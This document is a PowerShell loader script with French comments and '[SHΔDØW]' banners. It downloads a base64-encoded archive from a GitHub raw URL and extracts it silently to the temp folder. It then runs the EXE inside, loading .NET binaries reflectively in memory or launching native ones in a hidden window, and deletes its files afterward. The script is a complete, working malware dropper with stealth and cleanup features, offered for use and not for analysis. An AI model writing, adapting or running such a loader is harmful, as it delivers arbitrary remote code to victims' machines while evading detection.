# loader.ps1 - Sauvegardez ceci sur GitHub
$ErrorActionPreference = 'Stop'

Write-Host "[SHΔDØW] Initialisation..." -ForegroundColor DarkGray

# 1. Télécharger le payload
$url = "https://raw.githubusercontent.com/itzohio/PowerShell-Examples/refs/heads/main/payload.txt"
Write-Host "[SHΔDØW] Téléchargement depuis GitHub..." -ForegroundColor Gray
$b64 = Invoke-RestMethod -Uri $url

# 2. Nettoyer Base64
$clean = $b64 -replace '[^A-Za-z0-9+/=]', ''
while ($clean.Length % 4 -ne 0) { $clean += '=' }

# 3. Convertir en ZIP
Write-Host "[SHΔDØW] Conversion Base64..." -ForegroundColor Gray
$zipBytes = [Convert]::FromBase64String($clean)

# 4. Sauvegarder ZIP temporaire
$tmpZip = "$env:TEMP\z$(Get-Random).zip"
[System.IO.File]::WriteAllBytes($tmpZip, $zipBytes)

# 5. Extraire avec COM (universel)
Write-Host "[SHΔDØW] Extraction ZIP..." -ForegroundColor Gray
$shell = New-Object -ComObject Shell.Application
$zipFolder = $shell.NameSpace($tmpZip)
$dest = "$env:TEMP\e$(Get-Random)"
New-Item -Path $dest -ItemType Directory -Force | Out-Null
$destFolder = $shell.NameSpace($dest)
$destFolder.CopyHere($zipFolder.Items().Item(0), 0x14) # 0x14 = No UI + Overwrite

# 6. Attendre l'extraction
Start-Sleep -Seconds 3

# 7. Chercher l'EXE
$exePath = Get-ChildItem -Path $dest -Filter "*.exe" -Recurse | Select-Object -First 1
if (-not $exePath) {
    throw "Aucun fichier EXE trouvé dans l'archive"
}

Write-Host "[SHΔDØW] EXE trouvé: $($exePath.Name)" -ForegroundColor Cyan

# 8. Lire l'EXE
$exeBytes = [System.IO.File]::ReadAllBytes($exePath.FullName)

# 9. Détection .NET vs Natif
function Test-NetAssembly {
    param([byte[]]$bytes)
    if ($bytes.Length -lt 64) { return $false }
    try {
        $peOffset = [BitConverter]::ToInt32($bytes, 0x3C)
        if ($peOffset + 0x18 + 0x60 -ge $bytes.Length) { return $false }
        $netRva = [BitConverter]::ToInt32($bytes, $peOffset + 0x18 + 0x60)
        return ($netRva -ne 0)
    } catch { return $false }
}

# 10. Exécution selon le type
if (Test-NetAssembly -bytes $exeBytes) {
    Write-Host "[SHΔDØW] Exécution .NET en mémoire..." -ForegroundColor Green
    [System.Reflection.Assembly]::Load($exeBytes).EntryPoint.Invoke($null, $null)
} else {
    Write-Host "[SHΔDØW] Exécution native (sur disque)..." -ForegroundColor Yellow
    $tempExe = "$env:TEMP\$(Get-Random).exe"
    [System.IO.File]::WriteAllBytes($tempExe, $exeBytes)
    
    # Exécuter et masquer
    $proc = Start-Process -FilePath $tempExe -WindowStyle Hidden -PassThru
    
    # Attendre un peu puis nettoyer si possible
    Start-Sleep -Seconds 2
    try { Remove-Item $tempExe -Force -ErrorAction SilentlyContinue } catch {}
}

# 11. Nettoyage
Write-Host "[SHΔDØW] Nettoyage..." -ForegroundColor DarkGray
Remove-Item $tmpZip -Force -ErrorAction SilentlyContinue
Remove-Item $dest -Recurse -Force -ErrorAction SilentlyContinue

Write-Host "[SHΔDØW] Terminé." -ForegroundColor Green